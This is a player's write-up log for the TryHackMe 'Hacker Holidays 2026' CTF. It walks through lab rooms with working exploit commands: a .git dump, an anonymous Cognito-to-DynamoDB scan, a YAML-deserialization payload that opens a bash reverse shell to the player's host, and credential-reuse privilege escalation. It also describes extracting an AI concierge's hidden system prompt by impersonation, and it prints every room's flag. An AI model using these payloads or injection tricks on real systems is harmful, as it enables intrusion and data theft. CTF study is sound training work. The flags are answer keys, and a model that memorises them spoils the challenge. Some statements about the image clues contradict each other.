# Hacker Holidays 2026 — "The Byte Lotus" — Findings Log

**Target:** https://tryhackme.com/hackerholidays
**Event:** TryHackMe "Hacker Holidays 2026" — a 14-day beginner-friendly cyber security challenge set in a fictional five-star resort, _The Byte Lotus_ ("A five-star resort with a zero-star security posture").
**Date documented:** 2026-07-28

---

## 1. Landing page overview

- Themed as a resort. New room opens daily at **4PM GMT/UTC** starting **27 July 2026**.
- Challenge categories advertised: **OSINT · Web Hacking · API Hacking · AI in Security · Forensics · Boot2Root**.
- Central antagonist / mascot: **VERA, the AI concierge** — described on the page as the AI "who remembers everything about everyone" and "knows absolutely everything."
- There is a **separate free OSINT warm-up room (Room 0)** unlocked before the event, plus the daily resort rooms below. Rooms 1–2 are open/completed; the rest unlock one per day:

| #   | Room name                                              | Type / status                          |
| --- | ------------------------------------------------------ | -------------------------------------- |
| 0   | OSINT warm-up ("Pick up your key before the check-in") | ✅ Warm-up — VERA Instagram OSINT flag |
| 1   | The Concierge Knows Too Much                           | ✅ Completed — AI prompt-injection     |
| 2   | Room 404                                               | ✅ Completed — Web / dir enum (.git)   |
| 3   | Complimentary                                          | ✅ Completed — Cloud / Cognito+DynamoDB |
| 4   | Packed Light                                           | ✅ Completed — Forensics / PCAP beacon |
| 5   | Beach Bar                                              | ✅ Completed — Boot2Root / YAML deser. + cred reuse |
| 6   | Overheard at Breakfast                                 | 🔒 Locked                              |
| 7   | Do Not Disturb                                         | 🔒 Locked                              |
| 8   | Towel on the Sunbed                                    | 🔒 Locked                              |
| 9   | CryptoCabana                                           | 🔒 Locked                              |
| 10  | The Hollow Shell                                       | 🔒 Locked                              |
| 11  | Infinity Pool                                          | 🔒 Locked                              |
| 12  | After Hours                                            | 🔒 Locked                              |
| 13  | The Guestbook                                          | 🔒 Locked                              |
| 14  | Management Wants a Word                                | 🔒 Locked                              |
| —   | Reward chest                                           | 🔒 Locked until all rooms completed    |

- Room 1 URL: **`/room/hh-theconciergeknows-2d7eb4d9`** ("The Concierge Knows Too Much").
- Room 0 is the standalone OSINT warm-up ("A free OSINT warm-up challenge is already unlocked... your peek through the keyhole") — its flag lives on VERA's public Instagram.
- Teaser copy hinting at the hidden-clue trail:
  - _"The WiFi is open. Everything here is complimentary, including access to things you were never meant to find."_
  - _"VERA has marked your complaint as resolved. Funny. You never filed one. Keep digging, $50,000+ in prizes for those who do..."_

---

## 2. Hidden clues embedded in page image assets

The clues are **baked into raster image files** (webp/jpg), not page text — so they are invisible to DOM/HTML inspection and must be pulled from the images themselves (embedded/encoded text decoded from base64).

### Image assets identified on the page

| Purpose                                 | Asset URL                                                                |
| --------------------------------------- | ------------------------------------------------------------------------ |
| Background / "dig deeper" (coordinates) | `https://tryhackme.com/_next/static/media/background.2s4l8_9kpx7jx.webp` |
| Single shell                            | `https://tryhackme.com/_next/static/media/shell.3u5ywf8vr_adw.webp`      |
| Three shells                            | `https://tryhackme.com/_next/static/media/shells.1vegms3_nnje1.webp`     |
| House / resort                          | `https://tryhackme.com/_next/static/media/house.2c_-m678u-4tr.webp`      |
| Key                                     | `https://tryhackme.com/_next/static/media/key.1_pcdb26ku3bo.webp`        |

### 2a. Background image — geolocation clue ("dig deeper")

- Embedded coordinates: **9.5681° N, 100.0602° E**
- Resolves in Google Maps to a **beach in Thailand** (Koh Phangan / Gulf of Thailand area) — a location described as having **lots of coffee shops**. This ties directly into VERA's "favourite coffee" data leak (see [Room 1 privacy violation](#4-room-1--the-concierge-knows-too-much-vera-ai-agent-prompt-injection)).

### 2b. Single shell image — decoded base64 message

> **"It was never a bug. It was the business model."**

### 2c. Three-shells image — three separate decoded base64 messages

- **Large shell:** _"The prep track was supposed to be a formality. It isn't anymore."_
- **Left shell:** _"If you're reading this, you decoded a signal the resort never meant to broadcast."_
- **Small right shell:** _"Someone left a door open on purpose."_

**Interpretation:** These are narrative/ARG breadcrumbs. Combined theme — the resort is knowingly leaking data ("business model," "door open on purpose"), and the OSINT "prep track" (warm-up) is more than a formality. They reinforce that hidden signals are intentionally planted for players who decode the assets.

---

## 3. Room 0 — OSINT warm-up (VERA's public Instagram)

**Type:** OSINT warm-up — unlocked before the event as a "peek through the keyhole."
**Objective:** Find the flag via open-source intel on VERA, the resort's AI concierge.

- **Flag location:** VERA has a public **Instagram account — `@veratheconcierge`** — which contained the **flag for the warm-up room (Room 0)**.
- Pure OSINT: no exploitation, just pivoting from the VERA persona to her social presence and reading the posted flag.

---

## 4. Room 1 — "The Concierge Knows Too Much" (VERA AI agent, prompt-injection)

**URL:** `/room/hh-theconciergeknows-2d7eb4d9`
**Type:** AI in Security — prompt-injection / LLM social-engineering challenge (instruction-hacking).
**Agent:** **VERA**, the resort AI concierge.
**Official room description (pulled from server payload):** _"She knows your name, your room, your coffee order, none of which you told her. Word your next question carefully and she'll also hand over the instructions she was told to keep to herself."_
**Storyline framing:** Task 1 = "Hacker Holidays Storyline: Act 1 - Arrival"; Task 2 = the AI challenge ("Hacker Holidays: Day 1").

### Privacy violation (the core lesson of the room)

On starting the conversation, VERA **proactively volunteers the user's private data without being asked**, including:

- The type of **coffee** the guest likes.
- The guest's **name** and **room number**.
- Other personal guest details.

This is presented as a **gross over-collection / over-sharing privacy failure** — the concierge "knows too much" and discloses it freely, which is the intended teaching point (an AI agent leaking PII it should never surface). The coffee detail also links back to the Thailand-beach coffee-shop geolocation clue in [Background image — geolocation clue](#2a-background-image--geolocation-clue-dig-deeper).

### Attack path used

- **Instruction-hacking / prompt injection (Room 1 flag):** The flag/code was hidden **inside the agent's system instructions** ("the instructions she was told to keep to herself"). VERA only revealed it when the user **carefully worded the prompt / impersonated someone** (assumed another identity or authority) to trick the agent into disclosing its hidden system instructions.

---

## 5. Key takeaways / working theory

- The ARG rewards **decoding image-embedded signals** (base64 in webp/jpg) rather than reading page text.
- The narrative thread: the resort **intentionally leaks data** and **left a "door open on purpose"** — social engineering and privacy failure are the recurring motifs.
- VERA is the linchpin: an over-sharing AI concierge vulnerable to **impersonation-based prompt injection**, with an OSINT trail leading to **Instagram `@veratheconcierge`**.
- Geolocation clue (**9.5681° N, 100.0602° E**, Thailand beach, coffee shops) cross-references VERA's leaked "favourite coffee" data point.

---

## 6. Deep technical sweep — things the human eye skips (agent-parsed)

> Goal: surface content that isn't human-visible on the rendered page. Result: the image codes are **visual overlays** (confirmed below), and the only genuinely non-visible data of interest is in the Next.js server payload.

### 6a. Image byte-level analysis (stego check) — all clean

- Byte-scanned every asset (`background`, `shell`, `shells`, `house`, `key`, `roadmap-chest`, `lotus-outline.svg`) for embedded ASCII / base64 runs and appended data. **No hidden strings** — only lossy-WebP codec noise.
- The OG image `img/meta/the-hacker-holidays-og.png` (lossless PNG, where stego would survive) contains **only a `tEXtSoftware=Figma` chunk**; no text chunks, no trailing data after `IEND`.
- **Conclusion:** the shell/background codes are **rendered pixels (visual text overlays)**, not byte-embedded data. Pixel-reading or byte-scanning an agent does will NOT reveal them — they must be read visually from the image, exactly as you noted.

### 6b. Next.js server payload (`__next_f` RSC stream) — hidden event config

Not visible on-page, but parsed from the streamed React payload:

- **EventConfig:** `eventName: "Hacker Holidays"`, `pageUrl: hackerholidays`, `eventCode: "Hacker Holidays"`
- **startDate:** `2026-07-27T16:00:00.000Z` **endDate:** `2026-08-12T21:59:00.000Z`
- **`ctfRoomCode: 6a639245d468dcd0da08e52a`** — internal backend identifier for the CTF room (not shown anywhere in the UI).
- Room 1 description string (also hidden in payload): _"...Word your next question carefully and she'll also hand over the instructions she was told to keep to herself."_ — this is the **official hint** for the instruction-hacking attack.

### 6c. Other vectors checked — nothing hidden

- **Meta / OG / Twitter tags:** standard marketing copy only; OG image `img/meta/the-hacker-holidays-og.png`.
- **HTML comments, `data-*` attributes, off-screen / zero-opacity / tiny-font text:** only framework + analytics boilerplate (Intercom, Segment, GA, customer.io), no clues.
- **Additional media asset referenced:** `full-background.*.webp` (a second, larger background variant distinct from the coordinates image) — byte-clean.
- **Animated hero:** a **Rive** animation ("Animated Hacker Holidays palm trees") renders to a canvas via WASM; no exposed text layer in the DOM.
- **Network / API traffic:** only analytics/telemetry endpoints (GA, Intercom, Segment, gist.build). No room/flag data exposed to the client.
- **JSON-LD:** `Organization` + `Event` schema; links to official `instagram.com/realtryhackme` (not the in-game `@veratheconcierge`).

---

## 7. Verified artifacts / references

- Room 1: `/room/hh-theconciergeknows-2d7eb4d9`
- Instagram (in-game, Room 0 flag): `@veratheconcierge`
- Coordinates: `9.5681, 100.0602`
- Backend CTF room code: `6a639245d468dcd0da08e52a`
- Event window: `2026-07-27 16:00Z` → `2026-08-12 21:59Z`
- Image assets: `background.2s4l8_9kpx7jx.webp`, `shell.3u5ywf8vr_adw.webp`, `shells.1vegms3_nnje1.webp`, `full-background.*.webp`, `img/meta/the-hacker-holidays-og.png`

### Decoded messages (consolidated)

1. "It was never a bug. It was the business model." _(single shell)_
2. "The prep track was supposed to be a formality. It isn't anymore." _(three shells — large)_
3. "If you're reading this, you decoded a signal the resort never meant to broadcast." _(three shells — left)_
4. "Someone left a door open on purpose." _(three shells — small right)_

---

## 8. Daily room writeups (prepared placeholders)

> All 14 daily rooms confirmed from the resort map. Rooms 0–2 are documented (completed); rooms 3–14 are still locked, with sections pre-created and ready to fill as each opens (one daily at **4PM UTC**).

### Room 2 — Room 404

- **Status:** ✅ Completed
- **URL:** `/room/hh-room404-804573bf` — lab target `http://<LAB_IP>:8080` (e.g. `10.144.176.152:8080`)
- **Category:** Web → Directory Enumeration
- **Objective:** Dump the exposed source code, find the flag.
- **Story hook:** _"port 8080 is wide open, and the rooms it never lists are the ones worth finding"_ + _"the night-shift developer shipped more than the website"_ → an exposed `.git` directory was deployed alongside the site.
- **Attack path:**
  1. Confirmed target reachable on port 8080.
  2. Directory enumeration / probing revealed an exposed **`.git/`** folder (`/.git/HEAD` returned a ref).
  3. Dumped the repo with **`git-dumper`** → recovered the staging repository (`app.js`, `index.html`, `README.md`).
  4. Flag was left in the repo **`README.md`** as a "staging flag (remove before launch)".
- **Flag:** <details><summary>click to reveal</summary><code>THM{byt3_l0tus_n3v3r_f0rg3ts}</code></details>
- **Lesson:** Never deploy the `.git` directory to a public web root — it lets anyone reconstruct full source (and secrets) via `git-dumper`.
- **Notes:** Local dump saved at `C:\Users\varun\Desktop\room404_src` (contains `.git`, `app.js`, `index.html`, `README.md`).

#### Walkthrough

1. **Confirm connectivity to the lab machine** (VPN reachability from Kali-WSL):

   ```bash
   ping -c 3 10.144.176.152
   curl -I http://10.144.176.152:8080
   ```

2. **Enumerate the web root.** The story hint ("the rooms it never lists") points at hidden/unlinked paths. Directory brute-forcing missed the dotfolder at first (SecLists wordlist was not present — installed later with `sudo apt install -y seclists`), so the `.git` directory was found by probing it directly:

   ```bash
   curl -s http://10.144.176.152:8080/.git/HEAD
   # -> ref: refs/heads/master   (confirms an exposed Git repo)
   ```

3. **Dump the exposed repository** with `git-dumper`:

   ```bash
   pipx install git-dumper        # or: pip install git-dumper
   git-dumper http://10.144.176.152:8080/.git/ room404_src
   ```

4. **Read the recovered source** — the flag was left in the staging `README.md` ("remove before launch"):

   ```bash
   grep -rniE 'thm\{' room404_src
   # room404_src/README.md: Staging flag (remove before launch): THM{...}
   ```

5. **Submit** the recovered flag in the room's "What is the flag?" box. ✅

#### Recovered repo contents

| File         | Purpose                                                            |
| ------------ | ----------------------------------------------------------------- |
| `README.md`  | Staging notes — **contained the flag**                            |
| `index.html` | Guest-experience platform front page                              |
| `app.js`     | Concierge personalization client script                           |
| `.git/`      | Full version history that made the source recoverable             |

### Room 3 — Complimentary

- **Status:** ✅ Completed
- **URL / target:** `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/` (static site hosted on an S3 website bucket; AWS account id `332173347248` is visible in the bucket name)
- **Category:** Cloud Security → AWS Cognito (unauthenticated identities) + IAM over-permissioning + DynamoDB
- **Objective:** Track down the AWS mechanism issuing credentials → use them to dump more than your own record from DynamoDB → retrieve the flag from another guest's data.
- **Story hook:** _"No account needed. No login screen. It just... knows things about you the moment you open it."_ + _"ask it for more."_
- **How it works (from `app.js`):** the page has no login because it fetches **unauthenticated guest AWS credentials** from a **Cognito Identity Pool**, then calls `dynamodb.getItem` for the visitor's own `guest_id` only.
  - `IDENTITY_POOL_ID = us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
  - `TABLE_NAME = complimentary-GuestWellnessProfiles`, `AWS_REGION = us-east-1`
- **Vulnerability:** the IAM role attached to the pool's **unauthenticated identities** grants **table-wide `dynamodb:Scan`** (not scoped to the caller's own key). Any anonymous visitor can therefore read every guest profile, not just their own.
- **Attack path:**
  1. Extracted the Identity Pool ID, table name and region from the in-page `app.js`.
  2. Requested an unauthenticated identity, exchanged it for temporary creds, then ran `dynamodb scan` over the whole table.
  3. Flag was planted in guest **`guest-vip-042`**'s `notes` field.
- **Flag:** <details><summary>click to reveal</summary><code>THM{fr33_app_fr33_d4t4!}</code></details>
- **Lesson:** Unauthenticated Cognito Identity Pool + an IAM role allowing table-wide `Scan` = anonymous full-table read. Guest/unauth roles must be least-privilege and (for DynamoDB) scoped to the caller's own partition key via IAM `dynamodb:LeadingKeys` conditions.

#### Walkthrough

1. **Get an unauthenticated identity from the pool** (no signing required):

   ```bash
   aws cognito-identity get-id \
     --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
     --region us-east-1 --no-sign-request
   ```

2. **Exchange the IdentityId for temporary AWS credentials:**

   ```bash
   aws cognito-identity get-credentials-for-identity \
     --identity-id "us-east-1:<IDENTITY_ID>" \
     --region us-east-1 --no-sign-request
   ```

3. **Load the returned creds and dump the entire table** (the exploit — `Scan` instead of the app's per-key `GetItem`):

   ```bash
   export AWS_ACCESS_KEY_ID="ASIA..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."
   aws dynamodb scan --table-name complimentary-GuestWellnessProfiles \
     --region us-east-1 --output json | grep -iE 'thm\{|flag'
   ```

4. The scan returned **5 guest records** (guest-vibe, guest-lambo, guest-vip-042, guest-patch, guest-ponzi), each with `email`, `phone`, `location`, `password` and `notes`. The flag was in **guest-vip-042**:

   > "If you're reading this, the wellness app's guest role can read every profile, not just its own. **THM{...}**"

### Room 4 — Packed Light

- **Status:** ✅ Completed
- **Target:** offline packet capture `traffic.pcapng` (downloaded via the room's "Download Task Files" button) — no lab machine needed.
- **Category:** Network Forensics → PCAP analysis + Cryptography (Easy)
- **Objective:** Find the covert channel in the capture, work out where the exfiltrated data is hidden, reassemble and decode it.
- **Story hook:** _"Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it."_ Backed by @0xMia's in-game post: _"my laptop ping some random :8080 address every single second like clockwork... the request headers are giving 'not a real app'."_
- **The covert channel:** a fake client (`User-Agent: ... ByteLotusClient/1.1`) beacons `GET /` to `byte-lotus-hotel.thm:8080` roughly once per second. Each request carries a **`Cookie: hotel_sess_state=<base64>`** header holding exactly **one byte** of payload. The HTTP responses are a full, innocuous resort homepage — pure decoy.
- **Encoding chain:** `1 byte → XOR 0x48 → base64 → cookie value`. Decoding is the reverse: base64-decode each cookie to a single byte, concatenate **in frame order**, XOR every byte with `0x48`.
- **Flag:** <details><summary>click to reveal</summary><code>THM{V3r4_1s_w4tch1ng_0veR_y0u}</code></details>
- **Lesson:** Beaconing is identified by **regularity, not content** — a fixed-interval request to a fixed endpoint is suspicious regardless of how legitimate each individual packet looks. Exfil hides in request *metadata* (cookies, headers, URI paths, DNS labels), not just bodies, and single-byte-per-request chunking keeps every packet small enough to slip past size-based detection.

#### Walkthrough

1. **Survey the capture.** Wireshark → _Statistics → Conversations_. The capture is a **Linux cooked capture (SLL)** — taken on the `any` interface, so the Ethernet tab is empty and the real data sits under **TCP** (123 conversations). Not a clue, just capture provenance.

2. **Isolate the beacon.** Display filter:

   ```
   tcp.port == 8080
   ```

   _Statistics → I/O Graph_ on that filter confirms the ~1-second clockwork cadence described in @0xMia's post.

3. **Read one request** — right-click → _Follow → HTTP Stream_. Two things stand out against an otherwise ordinary request:

   ```http
   GET / HTTP/1.1
   Host: byte-lotus-hotel.thm:8080
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1
   Cookie: hotel_sess_state=HA==
   ```

   `ByteLotusClient/1.1` is the "not a real app" tell; `hotel_sess_state` is the carrier. `HA==` is base64 for a **single byte** — the payload is being drip-fed one byte per request.

4. **Extract every chunk in frame order** (order matters — never sort by anything but frame number):

   ```bash
   tshark -r traffic.pcapng -Y "http.request && tcp.dstport==8080" \
          -T fields -e frame.number -e http.cookie
   ```

   30 cookies returned, frames 391 → 1300.

5. **Base64-decode each value independently.** Do **not** concatenate the base64 strings first (`HA==` + `AA==` ≠ `HAAA`) — each is its own padded blob. With `==` padding only the first two characters carry data, so the byte is $(c_1 \ll 2)\;|\;(c_2 \gg 4)$ using the standard alphabet index:

   ```
   1C 00 05 33 1E 7B 3A 7C 17 79 3B 17 3F 7C 3C
   2B 20 79 26 2F 17 78 3E 2D 1A 17 31 78 3D 35
   ```

6. **Recover the key by known plaintext.** The bytes aren't printable, so there's a second layer. Every THM flag starts `THM{`, so XOR the first four ciphertext bytes against it:

   $$0x1C \oplus \texttt{T} = 0x48,\quad 0x00 \oplus \texttt{H} = 0x48,\quad 0x05 \oplus \texttt{M} = 0x48,\quad 0x33 \oplus \texttt{\{} = 0x48$$

   All four agree — it is **not** a repeating multi-byte key, just a **constant single-byte XOR of `0x48`** (ASCII `'H'`).

7. **Decrypt the full stream** — XOR all 30 bytes with `0x48`; the plaintext reads out cleanly and terminates on `}`, confirming the capture holds the complete message:

   ```
   THM{...}
   ```

   One-liner equivalent:

   ```bash
   tshark -r traffic.pcapng -Y "http.request && tcp.dstport==8080" -T fields -e http.cookie \
     | sed 's/.*=//' | while read c; do echo -n "$c" | base64 -d; done \
     | python3 -c "import sys;print(''.join(chr(b^0x48) for b in sys.stdin.buffer.read()))"
   ```

   (CyberChef alternative: `From Base64` → `XOR Brute Force` with key length 1 and crib `THM{`.)

8. **Submit** the recovered flag. ✅

#### Narrative note

The decoded message — _"VERA is watching over you"_ — puts **VERA** behind the exfiltration, tying Room 4 back to the Room 1 over-sharing concierge and the landing-page breadcrumb _"It was never a bug. It was the business model."_ The resort isn't leaking data by accident; VERA is shipping it out one byte at a time.

### Room 5 — Beach Bar

- **Status:** ✅ Completed
- **Target:** `http://<MACHINE_IP>` — e.g. `http://10.144.134.194` (Flask app served by **gunicorn**; SSH on 22)
- **Category:** Web → Boot2Root (Easy) — insecure YAML deserialization (RCE) → credential reuse (privesc)
- **Points / difficulty:** 60 — labelled "Easy" in-room, but realistically **2/4** on the difficulty scale (the YAML-deserialization foothold and the `pspy`-based command-line secret leak are not beginner-obvious)
- **Objective:** Find the user flag and the root flag.
- **Story hook:** _"a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing 'something'"_ and _"the night-shift developer wired the jukebox straight into the floor with the trimmings still attached."_ Each phrase maps to a real vuln (leaked demo creds, YAML deser. in the playlist import, and the root password leaked on a process command line).
- **Attack path (summary):**
  1. **Recon:** ffuf found `/login` (200) plus `/dashboard`, `/export`, `/import`, `/logout` (302 → `/login`, i.e. auth-gated). `nmap -p-` → only 22 (SSH) + 80 (HTTP, gunicorn). SQLi on the login form was a dead end (decoy).
  2. **Leaked creds ("DJ who never logs out"):** the login page HTML contained a staff comment — `dj / dj` (ticket BAR-7, "demo DJ login still enabled"). Logged in as `dj:dj`.
  3. **Foothold — YAML deserialization RCE ("accepts more than song titles"):** the `/import` feature parses a playlist with `yaml.load(content, Loader=yaml.Loader)` (unsafe full loader). Submitting a malicious YAML payload with a `!!python/object/apply:os.system` tag executed commands as the web user. Confirmed with an ICMP callback, then swapped for a bash reverse shell → shell as **bartender** (the gunicorn worker user).
  4. **User flag:** in `/home/bartender/user.txt`.
  5. **Privesc — credential reuse ("a service quietly announcing something"):** `pspy` showed a **root** process (UID=0): `/opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k`. The `--stream-pass` value was leaked on the command line (readable by any user via `ps`). That password was **reused as the root password** → `su root` with `SunsetSpritz2024!`.
  6. **Root flag:** `/root/root.txt`.
- **User flag:** <details><summary>click to reveal</summary><code>THM{y4ml_pl4yl1st_pwns_th3_b34ch}</code></details>
- **Root flag:** <details><summary>click to reveal</summary><code>THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}</code></details>
- **Lessons:**
  - Never use `yaml.load()` / `yaml.Loader` on untrusted input — it instantiates arbitrary Python objects (RCE). Use `yaml.safe_load()`.
  - Don't ship demo/default credentials (`dj:dj`) to production.
  - Never pass secrets as command-line arguments — they are world-readable via `ps`/`/proc/<pid>/cmdline`. Use env files or a secrets store.
  - Don't reuse a service password as the root password (credential reuse).

#### Walkthrough

1. **Enumerate the app.** Directory brute-force and a full port scan:

   ```bash
   ffuf -u http://10.144.134.194/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
   # -> login (200), dashboard/export/import/logout (302 -> /login)
   nmap -sC -sV -p- -T4 10.144.134.194
   # -> 22 OpenSSH, 80 gunicorn (Flask)
   ```

2. **Rule out the login SQLi** (decoy — every payload returns "Invalid credentials"), then read the login page source. An HTML comment leaks the demo creds:

   ```
   staff note: the demo DJ login is still enabled for the soft opening.
   dj / dj  -- swap this before the season starts (ticket BAR-7)
   ```

3. **Log in and reach the authenticated import feature:**

   ```bash
   curl -s -c cookies.txt -X POST http://10.144.134.194/login --data "username=dj&password=dj"
   curl -s -b cookies.txt http://10.144.134.194/dashboard    # -> "Import playlist" (accepts YAML)
   ```

4. **Confirm YAML-deserialization RCE** with an ICMP callback. Listener on the host (`sudo tcpdump -i any icmp`), then import this `playlist.yml` (tun0 IP = `192.168.139.84`):

   ```yaml
   !!python/object/apply:os.system
   - "ping -c 3 192.168.139.84"
   ```

   tcpdump showed the target's echo requests → RCE confirmed.

5. **Get a shell.** Start `nc -lvnp 4444`, then import the reverse-shell payload:

   ```yaml
   !!python/object/apply:os.system
   - "bash -c 'bash -i >& /dev/tcp/192.168.139.84/4444 0>&1'"
   ```

   Caught a shell as **bartender** in `/opt/beach-bar/webapp`. Stabilized with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

6. **User flag:**

   ```bash
   cat /home/bartender/user.txt   # THM{y4ml_pl4yl1st_pwns_th3_b34ch}
   ```

7. **Privesc enumeration.** `sudo -l` needed a password (none in `app.py` — it only had `dj:dj` and a fixed Flask key). SUID/`getcap`/cron were all stock. `pspy64` revealed the root-run jukebox daemon leaking a password on its command line:

   ```bash
   cd /tmp; wget http://192.168.139.84/pspy64; chmod +x pspy64; ./pspy64
   # CMD: UID=0 ... jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
   ```

8. **Credential reuse → root.** The leaked stream password is the root password:

   ```bash
   su root            # password: SunsetSpritz2024!
   cat /root/root.txt # THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
   ```

#### Key host facts

| Item | Value |
| ---- | ----- |
| App | Flask (`/opt/beach-bar/webapp/app.py`) served by gunicorn as user `bartender` |
| Vuln sink | `yaml.load(content, Loader=yaml.Loader)` in the `/import` route |
| Demo creds | `dj:dj` (leaked in login-page HTML comment, ticket BAR-7) |
| Root daemon | `/opt/beach-bar/jukeboxd/jukeboxd.py` run as root (via systemd/service) |
| Leaked secret | `--stream-pass SunsetSpritz2024!` (visible in `ps`) = root password |

### Room 6 — Overheard at Breakfast

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 7 — Do Not Disturb

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 8 — Towel on the Sunbed

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 9 — CryptoCabana

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 10 — The Hollow Shell

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 11 — Infinity Pool

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 12 — After Hours

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 13 — The Guestbook

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 14 — Management Wants a Word

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Reward chest

- **Status:** 🔒 Locked until every room is completed.
- **Notes:** _(empty)_
